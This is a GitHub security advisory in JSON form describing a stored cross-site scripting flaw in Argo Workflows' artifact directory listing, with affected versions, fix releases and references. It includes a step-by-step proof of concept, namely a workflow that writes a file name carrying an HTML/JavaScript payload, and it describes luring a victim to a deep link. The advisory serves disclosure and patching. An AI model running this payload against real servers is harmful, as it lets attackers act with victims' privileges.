{
  "id": "GHSA-cv78-6m8q-ph82",
  "modified": "2026-01-21T22:26:19.395372Z",
  "published": "2026-01-21T22:00:38Z",
  "aliases": [
    "CVE-2026-23960"
  ],
  "summary": "Argo Workflows affected by stored XSS in the artifact directory listing",
  "details": "### Summary\nStored XSS in the artifact directory listing allows any workflow author to execute arbitrary JavaScript in another user’s browser under the Argo Server origin, enabling API actions with the victim’s privileges.\n\n### Details\nThe directory listing response in `server/artifacts/artifact_server.go` renders object names directly into HTML via `fmt.Fprintf` without escaping. Object names come from `driver.ListObjects(...)` and are attacker‑controlled when a workflow writes files into an output artifact directory.\n\nhttps://github.com/argoproj/argo-workflows/blob/9872c296d29dcc5e9c78493054961ede9fc30797/server/artifacts/artifact_server.go#L194-L244\n\n### PoC\n1. Deploy Argo Workflows:\n```\nkubectl create ns argo\nkubectl apply --server-side -f manifests/base/crds/full\nkubectl apply --server-side -k manifests/quick-start/postgres\n```\n2. Port‑forward Argo Server:\n```\nkubectl -n argo port-forward deploy/argo-server 2746:2746\n```\n3. Create the PoC workflow:\n```yml\ncat \u003e /tmp/argo-xss.yaml \u003c\u003c'EOF'\napiVersion: argoproj.io/v1alpha1\nkind: Workflow\nmetadata:\n  generateName: xss-artifact-test-\nspec:\n  entrypoint: main\n  templates:\n  - name: main\n    container:\n      image: alpine\n      command: [sh, -c]\n      args:\n      - |\n        mkdir -p /tmp/artifacts\n        touch '/tmp/artifacts/xss\"\u003e\u003cimg src=x onerror=\"alert(document.domain)\"\u003e.html'\n    outputs:\n      artifacts:\n      - name: dir\n        path: /tmp/artifacts\n        archive:\n          none: {}\nEOF\n```\n```\nkubectl -n argo create -f /tmp/argo-xss.yaml\n```\n4. Wait for completion:\n```\nkubectl -n argo get wf -w\n```\n5. Get the node ID:\n```\nkubectl -n argo get wf \u003cwf-name\u003e \\\n  -o jsonpath='{range .status.nodes.*}{.id}{\"\\t\"}{.displayName}{\"\\n\"}{end}'\n```\n6. Open the listing:\n`https://localhost:2746/artifact-files/argo/workflows/\u003cwf-name\u003e/\u003cnode-id\u003e/outputs/dir/`\n\n\u003cimg width=\"1220\" height=\"349\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9d859826-c7cd-403b-988e-74695552944b\" /\u003e\n\n### Impact\n- The attacker creates a workflow that produces a HTML artifact that contains a HTML file that contains a script which uses XHR calls to interact with the Argo Server API.\n- The attacker emails the deep-link to the artifact to their victim. The victim opens the link, the script starts running.\n\nAs the script has access to the Argo Server API (as the victim), so may do the following (if the victim may):\n- Read information about the victim’s workflows.\n- Create or delete workflows.",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-workflows/v3",
        "purl": "pkg:golang/github.com/argoproj/argo-workflows/v3"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "3.6.17"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-cv78-6m8q-ph82/GHSA-cv78-6m8q-ph82.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-workflows/v3",
        "purl": "pkg:golang/github.com/argoproj/argo-workflows/v3"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "3.7.0"
            },
            {
              "fixed": "3.7.8"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 3.7.7",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-cv78-6m8q-ph82/GHSA-cv78-6m8q-ph82.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/argoproj/argo-workflows",
        "purl": "pkg:golang/github.com/argoproj/argo-workflows"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "2.5.3-rc4"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-cv78-6m8q-ph82/GHSA-cv78-6m8q-ph82.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-cv78-6m8q-ph82"
    },
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-workflows/commit/159a5c56285ecd4d3bb0a67aeef4507779a44e17"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/argoproj/argo-workflows"
    },
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-workflows/blob/9872c296d29dcc5e9c78493054961ede9fc30797/server/artifacts/artifact_server.go#L194-L244"
    },
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-workflows/releases/tag/v3.6.17"
    },
    {
      "type": "WEB",
      "url": "https://github.com/argoproj/argo-workflows/releases/tag/v3.7.8"
    }
  ]
}